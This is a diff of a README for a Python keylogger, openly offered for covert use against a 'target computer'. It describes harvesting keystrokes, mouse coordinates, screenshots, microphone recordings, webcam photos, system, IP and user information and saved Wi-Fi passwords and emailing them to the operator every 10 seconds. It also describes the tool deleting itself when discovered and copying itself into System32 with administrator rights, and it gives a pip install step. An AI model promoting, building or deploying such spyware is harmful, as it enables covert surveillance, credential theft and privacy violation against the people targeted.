@@ -1,5 +1,7 @@
 # What Does This Keylogger Do?
-• Every 10 seconds you get **Keyboard**, **Mouse**, **ScreenShot**, **Microphone** and **SystemInfo** inputs from target computer and send to your mail.
+• First 10 seconds you get **System Information, IP Information, Local Users Information** and **Wifi passwords** from target computer and send to your mail.
+
+• 2nd and other mails (every 10 seconds) you get **Keyboard Inputs**, **Mouse Coordinates**, **ScreenShot**, **Microphone Recording** and **Photo (if target has a WebCam)** from target computer and send to your mail.
 
 • If the target finds the code and opens the file, the program **Deletes** itself.
 
@@ -19,11 +21,11 @@
 
 # Warning
 
-• You need to run the script as administrator because the code copies itself to `C:\Windows\System32`
+• You need to run the script as administrator because the script copies itself to `C:\Windows\System32`
 
 • Also, remember that **even the higher-level** file copying functions like `shutil.copy() and shutil.copy2()` can't copy all file metadata.
 
-• On Windows, file owners, ACLs and alternate data streams are not copied.
+• On Windows, file owners, Access Control Lists (ACLs) and alternate data streams are not copied.
 
 # INSTALLATION
 **• pip install -r requirements.txt**
